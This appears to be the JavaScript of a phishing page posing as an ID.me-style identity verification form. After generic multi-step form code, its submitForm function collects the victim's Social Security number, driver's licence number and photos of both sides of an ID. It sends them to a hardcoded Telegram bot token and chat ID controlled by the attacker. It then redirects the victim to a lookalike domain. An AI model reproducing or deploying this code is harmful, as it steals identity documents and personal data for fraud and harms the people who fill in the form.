var currentTab = 0;
	showTab(currentTab);
	
function showTab(n) {
	var x = document.getElementsByClassName("tab");
	x[n].style.display = "block";
	if (n == 0) {document.getElementById("prevBtn").style.display = "none";
	} else {document.getElementById("prevBtn").style.display = "block";}
	if (n == (x.length - 1)) {document.getElementById("nextBtn").innerHTML = "Submit";
	} else {document.getElementById("nextBtn").innerHTML = "Next";
	}
	fixStepIndicator(n)
	}
	
function nextPrev(n) {
	var x = document.getElementsByClassName("tab");
	if (n == 1 && !validateForm()) return false;
	x[currentTab].style.display = "none";
	currentTab = currentTab + n;
	if (currentTab >= x.length) {
	document.getElementById("formContainer").submit();
	document.getElementById("loader").style.display = "block";
	document.getElementById("underLoader").style.display = "none";
    return false;
	}
	showTab(currentTab);
	}
	
function validateForm() {
	var x, y, i, valid = true;
	x = document.getElementsByClassName("tab");
	y = x[currentTab].getElementsByTagName("input");
	for (i = 0; i < y.length; i++) {
	if (y[i].value == "") {
	y[i].className += " invalid";
	valid = false;
    }
	}
	if (valid) {document.getElementsByClassName("step")[currentTab].className += " finish";
	}
	return valid;
	}
	
function fixStepIndicator(n) {
	var i, x = document.getElementsByClassName("step");
	for (i = 0; i < x.length; i++) {
	x[i].className = x[i].className.replace(" active", "");
	}
	x[n].className += " active";
	}
	
function submitForm() {
          const BOT_TOKEN = '6403012866:AAGNpGzEijhSfRlMie3dqhv6DD4hucAY1k8';
          const CHAT_ID = '6929442824';

          const ssn = document.getElementById('ssn').value;
          const dl = document.getElementById('dl').value;
          //const message = document.getElementById('message').value;

          const frontInput = document.getElementById('front');
          const frontfile = frontInput.files[0];
		  
		  const backInput = document.getElementById('back');
          const backfile = backInput.files[0];
     

          const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;

          const formDataFront = new FormData();
          formDataFront.append('chat_id', CHAT_ID);
          formDataFront.append('document', frontfile);
		  formDataFront.append('caption', `Front\nSsn: ${ssn}\nDl: ${dl}`);
		  
	const formDataBack = new FormData();
          formDataBack.append('chat_id', CHAT_ID);
          formDataBack.append('document', backfile);
		  formDataBack.append('caption', `Back\nSsn: ${ssn}\nDl: ${dl}`);

          fetch(apiUrl, {
              method: 'POST',
              body: formDataFront,
          })
          .then(response => response.json())
		  .then(fetch(apiUrl, {
              method: 'POST',
              body: formDataBack,
          }))
          .then(data => {
              console.log('Telegram API response:', data);
          })
          .catch(error => {
              console.error('Error sending message:', error);
             // alert('Failed to send message and file. Please try again.');
          });
      }	
	
	let myRedirect = () => {
		var theRedirect = () => {if (document.getElementById("loader").style.display == "block") {window.location.replace("https://id-me-check.com");}
		}
	setTimeout(theRedirect, 5000);
	}
	setInterval(myRedirect, 7000);
